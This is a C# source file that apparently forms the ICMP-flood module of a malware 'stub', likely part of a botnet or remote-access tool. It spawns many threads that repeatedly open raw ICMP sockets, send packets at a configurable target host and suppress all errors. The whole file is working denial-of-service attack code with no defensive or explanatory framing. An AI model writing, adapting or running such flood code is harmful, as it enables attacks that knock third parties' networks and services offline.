using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;

namespace Stub
{
    internal class IcmpFlood
    {
        public static string Host;
        public static int Port;
        public static int Threads;
        public static int IcmpSockets;
        public static int PacketSize;

        private static List<Thread> FloodThreads = new List<Thread>();
        private static CancellationTokenSource cancelSource;
        private static IPEndPoint ipEndpoint;

        public static void StartIcmpFlood()
        {
            try
            {
                ipEndpoint = new IPEndPoint(Dns.GetHostEntry(Host).AddressList[0], Port);
            }
            catch
            {
                ipEndpoint = new IPEndPoint(IPAddress.Parse(Host), Port);
            }

            cancelSource = new CancellationTokenSource();

            for (int i = 0; i < Threads; i++)
            {
                var token = cancelSource.Token;
                Thread t = new Thread(() =>
                {
                    var sender = new IcmpSender(ipEndpoint, IcmpSockets, PacketSize);
                    sender.Run(token);
                });

                t.IsBackground = true;
                FloodThreads.Add(t);
                t.Start();
            }
        }

        public static void StopIcmpFlood()
        {
            if (cancelSource != null)
            {
                cancelSource.Cancel();

                foreach (var t in FloodThreads)
                {
                    try { t.Join(500); } catch { }
                }

                FloodThreads.Clear();
                cancelSource.Dispose();
                cancelSource = null;
            }
        }

        private class IcmpSender
        {
            private readonly IPEndPoint target;
            private readonly int socketCount;
            private readonly int packetSize;

            public IcmpSender(IPEndPoint target, int socketCount, int packetSize)
            {
                this.target = target;
                this.socketCount = socketCount;
                this.packetSize = packetSize;
            }

            public void Run(CancellationToken token)
            {
                byte[] buffer = new byte[packetSize];
                while (!token.IsCancellationRequested)
                {
                    Socket[] sockets = new Socket[socketCount];

                    try
                    {
                        for (int i = 0; i < socketCount; i++)
                        {
                            sockets[i] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
                            sockets[i].Blocking = false;
                            sockets[i].SendTo(buffer, target);
                        }

                        Thread.Sleep(100);
                    }
                    catch
                    {
                        // Fail silently
                    }
                    finally
                    {
                        foreach (var sock in sockets)
                        {
                            try
                            {
                                if (sock?.Connected == true)
                                    sock.Disconnect(false);

                                sock?.Close();
                            }
                            catch { }
                        }
                    }
                }
            }
        }
    }
}
